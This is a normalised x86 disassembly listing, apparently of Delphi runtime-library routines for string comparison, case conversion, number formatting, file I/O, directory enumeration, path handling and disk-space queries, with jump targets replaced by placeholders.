cmp bl [ edx + 0x7 ]
jne r-xdata
add ecx 0x2
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jle r-xdata
sub_4099e8
test eax eax
jne r-xdata
test edx edx
jne r-xdata
test edx edx
je r-xdata
push ebx
push ebp
push esi
mov ebp [ eax - 0x4 ]
mov ebx [ edx - 0x4 ]
sub ebp ebx
sbb ecx ecx
and ecx ebp
add ecx ebx
lea esi [ ecx + eax ]
add edx ecx
neg ecx
je r-xdata
mov eax [ eax - 0x4 ]
retn
retn
mov eax [ edx - 0x4 ]
neg eax
mov eax ebp
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp eax ebx
je r-xdata
add ecx 0x2
jl r-xdata
cmp al bl
je r-xdata
shr eax 0x8
shr ebx 0x8
cmp al 0x61
jl r-xdata
mov ah 0x0
mov bh 0x0
cmp al 0x61
jl r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
pop esi
pop ebp
pop ebx
retn
sub ebx 0x20
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp ah bh
je r-xdata
sub ebx 0x20
sub_409a84
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_4099e8
test eax eax
jne r-xdata
sub_409aa8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_4059dc
mov edx eax
mov eax edi
mov ecx ebx
call sub_405620
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_409ae0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_4059dc
mov edx eax
mov eax edi
mov ecx ebx
call sub_405620
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_409b18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_4059dc
push eax
push ebx
mov eax edi
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_409b5c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_409b7c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov esi eax
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_405530
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_405a44
pop ebp
pop edi
pop esi
pop ebx
retn
sub_409bd0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_405ec8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx * 2 - 0x2 ] 0x20
jbe r-xdata
cmp [ edi + esi * 2 - 0x2 ] 0x20
jbe r-xdata
mov eax ebp
call sub_405d28
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_405f58
pop ebp
pop edi
pop esi
pop ebx
retn
sub_409c20
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_405a44
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_409c58
push esi
push edi
mov edi eax
xor eax eax
mov esi edi
mov ecx esi
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x4
mov ecx [ ecx ]
movzx ecx [ edi ]
add cl 0xbf
sub cl 0x1a
jb r-xdata
mov cl 0x1
jmp r-xdata
mov cl 0x1
sub cl 0x4
je r-xdata
test cl cl
jne r-xdata
pop edi
pop esi
retn
test dl dl
je r-xdata
add cl 0xfe
sub cl 0x1a
jb r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx esi
test edx edx
je r-xdata
xor ecx ecx
jmp r-xdata
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
xor cl 0x1
mov al 0x1
inc edx
mov esi 0x2
inc edx
mov esi 0x2
inc esi
dec edx
jne r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
inc esi
dec edx
jne r-xdata
add cl 0xfe
sub cl 0xa
jb r-xdata
movzx ecx [ edi + esi - 0x1 ]
add cl 0xd0
sub cl 0xa
jb r-xdata
sub cl 0x4
je r-xdata
movzx ecx [ edi + esi - 0x1 ]
sub cl 0x2e
je r-xdata
jmp r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub cl 0x4
je r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub_409d24
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_409d3a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_409d3a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_409d3a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_409d70
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_409d24
mov edx esi
pop eax
call sub_405620
add esp 0x10
pop esi
retn
sub_409d90
or cl cl
jne sub_409dc4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_409dc4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_409dc4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_409dc4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_409e5c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_409d90
mov edx esi
pop eax
call sub_405620
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_409e84
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_409d24
mov edx esi
pop eax
call sub_405620
add esp 0x20
pop esi
retn
xor edx edx
sub_409eac
push ebp
mov ebp esp
cmp eax 0x20
jle r-xdata
push esi
mov esi esp
sub esp 0x20
mov ecx 0x10
push edx
mov edx eax
lea eax [ ebp + 0x8 ]
call sub_409d90
mov edx esi
pop eax
call sub_405620
add esp 0x20
pop esi
pop ebp
retn 0x8
xor eax eax
sub_409edc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_403ec4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_40976c
sub_409f30
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_403ec4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_409f50
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_406554
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_409f70
mov eax [ rw-data ]
call sub_40676c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_40676c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_405584
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_405584
sub_40a000
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
test edx edx
jl r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov ebx eax
mov edi [ ebp - 0x14 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
push esi
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
test al al
je r-xdata
sub edi 0x4
mov edi [ edi ]
add ebx 0x4
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
sub_40a084
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40b77c
mov edx eax
test dl dl
je r-xdata
call sub_409f70
push ebp
mov eax [ rw-data ]
call sub_406774
mov edx eax
mov eax [ rw-data ]
call sub_40a000
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_406774
mov edx eax
mov eax [ rw-data ]
call sub_40a000
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40a120
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_405584
call sub_409f70
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_405584
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_405584
jmp r-xdata
pop esi
pop ebx
retn
sub_40a16c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4059dc
push eax
call CreateFileA
sub_40a1c4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40a1f0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40a21c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call GetLastError
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_40a26c
push ebx
mov ebx eax
mov eax ebx
call sub_4059dc
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
je r-xdata
mov al 0x1
pop ebx
retn
sub_40a290
push ebx
mov ebx eax
mov eax ebx
call sub_4059dc
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
jne r-xdata
mov al 0x1
pop ebx
retn
sub_40a2b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_40a39d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40e87c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
mov edx eax
mov [ edx + 0xc ] 0x3
mov eax edx
call sub_404ec4
cmp eax 0x3
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
call sub_40a290
mov al 0x1
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40a5a0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405974
sete al
mov al 0x1
jmp r-xdata
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a3a4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40a5a0
mov eax [ ebp - 0x10 ]
call sub_40a2b4
test al al
je r-xdata
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40a84c
test al al
jne r-xdata
mov bl 0x1
sub_40a3ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
xor ebx ebx
lea eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call DosDateTimeToFileTime
test eax eax
je r-xdata
call GetLastError
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call LocalFileTimeToFileTime
test eax eax
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push esi
call SetFileTime
test eax eax
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a404
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x20 ]
and eax [ ebx + 0x18 ]
jne r-xdata
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
jne r-xdata
push esp
lea eax [ ebx + 0x34 ]
push eax
call FileTimeToLocalFileTime
push ebx
lea eax [ ebx + 0x2 ]
push eax
lea eax [ esp + 0x8 ]
push eax
call FileTimeToDosDateTime
mov eax [ ebx + 0x40 ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x3c ]
xor edx edx
mov edx eax
xor eax eax
or eax [ esp ]
or edx [ esp + 0x4 ]
add esp 0x8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea edx [ ebx + 0x4c ]
mov ecx 0x104
call sub_4057a0
xor esi esi
call GetLastError
mov esi eax
jmp r-xdata
mov eax esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40a488
push ebx
push esi
push edi
mov ebx ecx
mov edi eax
not edx
and edx 0x16
mov [ ebx + 0x18 ] edx
lea eax [ ebx + 0x20 ]
push eax
mov eax edi
call sub_4059dc
push eax
call FindFirstFileA
mov esi eax
mov [ ebx + 0x1c ] esi
cmp esi 0xffffffff
je r-xdata
call GetLastError
mov esi eax
mov eax ebx
call sub_40a404
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40a4fc
jmp r-xdata
sub_40a4d8
push ebx
mov ebx eax
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
je r-xdata
call GetLastError
pop ebx
retn
mov eax ebx
call sub_40a404
pop ebx
retn
sub_40a518
push ebx
push esi
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40e504
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40a54c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
test eax eax
je r-xdata
mov edi eax
mov eax ebx
call sub_4059dc
mov ebp eax
test edi edi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ebx [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_40aa40
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40e504
cmp al 0x2
jne r-xdata
dec edi
sub_40a5a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40a54c
mov esi eax
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_405a44
pop edi
pop esi
pop ebx
retn
sub_40a5d4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx ebx
mov eax edx
test eax eax
je r-xdata
cmp eax 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
cmp [ ebx + 0x1 ] 0x3a
sete al
jmp r-xdata
mov eax edx
test eax eax
je r-xdata
push edi
mov ecx 0x2
mov edx 0x1
mov eax ebx
call sub_405a44
jmp r-xdata
test al al
je r-xdata
cmp eax 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx ] 0x5c
sete al
jmp r-xdata
xor eax eax
cmp [ ebx + 0x1 ] 0x5c
sete al
jmp r-xdata
test al al
je r-xdata
mov eax edi
call sub_405530
xor ebp ebp
mov esi 0x3
jmp r-xdata
test al al
je r-xdata
mov eax ebx
call sub_40580c
cmp esi eax
jge r-xdata
cmp [ ebx + esi - 0x1 ] 0x5c
jne r-xdata
cmp ebp 0x2
jl r-xdata
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_405a44
jmp r-xdata
dec esi
cmp [ ebx + esi - 0x1 ] 0x5c
jne r-xdata
cmp ebp 0x2
jge r-xdata
inc ebp
inc esi
sub_40a68c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40a54c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_405a44
pop edi
pop esi
pop ebx
retn
sub_40a6c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40a54c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_405530
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_405a44
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40a70c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4059dc
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_405620
add esp 0x108
pop esi
pop ebx
retn
sub_40a748
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_40649c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_40649c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_40a7bc
push ebp
mov ebp esp
add esp 0xffffffec
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x6 ]
call sub_40bbe0
cmp [ ebp - 0x6 ] 0x7bc
jb r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x6 ] 0x83b
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x12 ]
push eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xe ]
lea eax [ ebp - 0xc ]
call sub_40b900
movzx eax [ ebp - 0x10 ]
shr eax 0x1
movzx edx [ ebp - 0xe ]
shl edx 0x5
or ax dx
movzx edx [ ebp - 0xc ]
shl edx 0xb
or ax dx
mov [ ebp - 0x4 ] ax
movzx eax [ ebp - 0x8 ]
shl eax 0x5
or ax [ ebp - 0xa ]
movzx edx [ ebp - 0x6 ]
sub dx 0x7bc
shl edx 0x9
or ax dx
mov [ ebp - 0x2 ] ax
sub_40a868
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
add eax 0x1
and eax 0xfffffffe
mov cx [ eax ]
add eax 0x2
test cl ch
jne r-xdata
test cl cl
je r-xdata
lea eax [ edx + eax - 0x2 ]
retn
test ch ch
jne r-xdata
lea eax [ edx + eax - 0x1 ]
retn
sub_40a8bc
sub edx eax
test eax 0x1
push eax
je r-xdata
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
movzx ecx [ edx + eax ]
mov [ eax ] cl
test ecx ecx
je r-xdata
mov [ eax ] cl
pop eax
retn
movzx ecx [ edx + eax ]
mov [ eax ] cx
add eax 0x2
cmp ecx 0xff
ja r-xdata
pop eax
retn
inc eax
sub_40a8f4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40a928
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx esi
test ebx ebx
je r-xdata
mov eax esi
call sub_4059dc
mov edx eax
mov ecx ebx
mov eax edi
call sub_40a8f4
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_40a950
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4059dc
mov edx eax
mov ecx edi
mov eax ebx
call sub_40a8f4
pop edi
pop esi
pop ebx
retn
sub_40a970
sub edx eax
jne r-xdata
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
xor eax eax
retn
movzx eax [ eax ]
sub eax ecx
retn
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x1
add eax 0x4
test cl cl
je r-xdata
sub eax 0x4
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x4
test cl cl
jne r-xdata
sub_40a9fc
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40aa54
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
